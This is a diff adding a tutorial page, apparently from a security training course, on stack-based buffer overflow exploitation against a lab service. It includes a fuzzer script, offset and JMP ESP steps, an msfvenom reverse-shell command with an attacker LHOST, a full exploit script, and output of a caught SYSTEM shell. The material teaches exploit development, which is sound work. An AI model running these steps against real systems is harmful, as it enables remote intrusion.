@@ -1,0 +1,226 @@
+---
+title: Buffer Overflows — Stack-Based Exploitation
+description: Understanding and exploiting stack-based buffer overflow vulnerabilities.
+---
+
+# Buffer Overflows — Stack-Based Exploitation
+
+Buffer overflow is the foundation of exploit development. Understanding it unlocks the entire field of binary exploitation. It's the technique behind legendary exploits like MS08-067 (Conficker), EternalBlue, and countless others.
+
+## Memory Layout: The Stack
+
+When a program runs, memory is organized into segments. The **stack** is where local variables and function call information are stored.
+
+```
+High Memory
+┌─────────────────────┐
+│   Function Args     │
+├─────────────────────┤
+│   Return Address    │  ← EIP (Instruction Pointer)
+├─────────────────────┤
+│   Saved EBP         │  ← Base Pointer
+├─────────────────────┤
+│   Local Variables   │
+│   (Buffer)          │  ← Our input goes here
+├─────────────────────┤
+│   ...               │
+└─────────────────────┘
+Low Memory
+```
+
+**Key registers:**
+- **EIP** (Extended Instruction Pointer): Points to the next instruction to execute — the most critical register
+- **ESP** (Extended Stack Pointer): Points to the top of the stack
+- **EBP** (Extended Base Pointer): Points to the base of the current stack frame
+
+## The Vulnerability
+
+```c
+// Vulnerable C code
+void vulnerable_function(char *input) {
+    char buffer[100];           // Only 100 bytes allocated
+    strcpy(buffer, input);      // No bounds checking!
+}
+```
+
+If you send 200 bytes, the extra 100 bytes **overflow** into adjacent memory, eventually overwriting the saved EIP. When the function returns, it jumps to whatever address is now in EIP — which you control.
+
+## The 4-Step Exploitation Process
+
+### Step 1: Fuzzing — Find the Crash
+
+Send increasing amounts of data until the application crashes.
+
+```python
+#!/usr/bin/env python3
+import socket
+
+ip = "10.10.10.5"
+port = 9999
+
+buffer = b"A" * 100
+
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.recv(1024)
+        
+        print(f"[*] Fuzzing with {len(buffer)} bytes")
+        s.send(buffer + b"\r\n")
+        s.recv(1024)
+        s.close()
+        
+        buffer += b"A" * 100
+    except Exception as e:
+        print(f"[!] Crashed at {len(buffer)} bytes")
+        break
+```
+
+<TerminalWindow
+  title="Fuzzing Output"
+  command="python3 fuzzer.py"
+  output="[*] Fuzzing with 100 bytes
+[*] Fuzzing with 200 bytes
+...
+[*] Fuzzing with 2100 bytes
+[!] Crashed at 2100 bytes"
+/>
+
+### Step 2: Find the Exact Offset
+
+Use a cyclic pattern to find exactly how many bytes reach EIP.
+
+```bash
+# Generate a unique 3000-byte pattern
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+# Or: msf-pattern_create -l 3000
+
+# Send the pattern to the application
+# When it crashes, note the value in EIP (e.g., 0x6f43396e)
+
+# Find the offset
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6f43396e
+# [*] Exact match at offset 2003
+```
+
+### Step 3: Control EIP
+
+Verify you control EIP by sending exactly `offset` bytes + 4 bytes for EIP.
+
+```python
+offset = 2003
+eip = b"B" * 4  # 0x42424242 — should appear in EIP
+
+payload = b"A" * offset + eip
+```
+
+In your debugger (Immunity Debugger / x64dbg), EIP should show `42424242`.
+
+### Step 4: Find Bad Characters & JMP ESP
+
+**Bad characters** are bytes that corrupt the payload (e.g., `\x00` null byte terminates strings).
+
+```python
+# Test all bytes 0x01-0xFF
+badchars = (
+    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+    # ... all bytes up to \xff
+)
+
+payload = b"A" * offset + b"B" * 4 + badchars
+```
+
+Find a `JMP ESP` instruction in the application's modules (not ASLR-protected):
+
+```
+# In Immunity Debugger with Mona plugin:
+!mona jmp -r esp -cpb "\x00\x0a\x0d"
+# [+] Results: 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
+```
+
+### Step 5: Generate Shellcode & Exploit
+
+```bash
+# Generate reverse shell shellcode (exclude bad chars)
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+  -b "\x00\x0a\x0d" -f python -v shellcode
+
+# Output:
+# shellcode = b"\xdb\xc0\xd9\x74\x24\xf4\x5a..."
+```
+
+```python
+#!/usr/bin/env python3
+import socket
+
+ip = "10.10.10.5"
+port = 9999
+
+offset = 2003
+jmp_esp = b"\xaf\x11\x50\x62"  # 0x625011af in little-endian
+nop_sled = b"\x90" * 16         # NOP sled before shellcode
+
+shellcode = (
+    b"\xdb\xc0\xd9\x74\x24\xf4\x5a..."  # Your msfvenom output
+)
+
+payload = b"A" * offset + jmp_esp + nop_sled + shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+s.recv(1024)
+s.send(payload + b"\r\n")
+```
+
+<TerminalWindow
+  title="Successful Exploitation"
+  command="nc -lvnp 4444"
+  output="Listening on 0.0.0.0 4444
+Connection received on 10.10.10.5 49234
+Microsoft Windows [Version 6.1.7601]
+C:\Program Files\VulnApp>whoami
+nt authority\system"
+/>
+
+## Modern Protections & Bypasses
+
+| Protection | Description | Bypass |
+|------------|-------------|--------|
+| **ASLR** | Randomizes memory addresses | Info leak, brute force (32-bit), ret2libc |
+| **DEP/NX** | Stack is non-executable | ROP (Return-Oriented Programming) |
+| **Stack Canaries** | Random value before return address | Info leak, format string |
+| **SafeSEH** | Validates exception handlers | Use non-SafeSEH modules |
+
+<InfoBox type="important">
+Classic stack overflows are rare in modern software due to these protections. However, they're still found in embedded systems, legacy software, and CTF challenges. Understanding them is the prerequisite for advanced techniques like ROP chains.
+</InfoBox>
+
+## Tools
+
+| Tool | Purpose |
+|------|---------|
+| Immunity Debugger + Mona | Windows debugging and exploit development |
+| x64dbg / x32dbg | Modern Windows debugger |
+| GDB + PEDA/pwndbg | Linux debugging |
+| pwntools | Python library for exploit development |
+| msfvenom | Shellcode generation |
+
+<Quiz
+  question="What register must you control to redirect program execution in a buffer overflow?"
+  answer="EIP (Instruction Pointer)"
+  hint="EIP tells the CPU where to fetch the next instruction. Control it, control execution."
+/>
+
+<Quiz
+  question="What is a NOP sled used for in buffer overflow exploits?"
+  answer="To increase the chance of landing in the shellcode by providing a slide of no-operation instructions"
+  hint="NOP (0x90) does nothing — it just slides execution into the shellcode."
+/>
+
+<Quiz
+  question="What technique bypasses DEP/NX by chaining existing code snippets?"
+  answer="ROP (Return-Oriented Programming)"
+  hint="Instead of injecting shellcode, you chain 'gadgets' — small existing code sequences ending in RET."
+/>
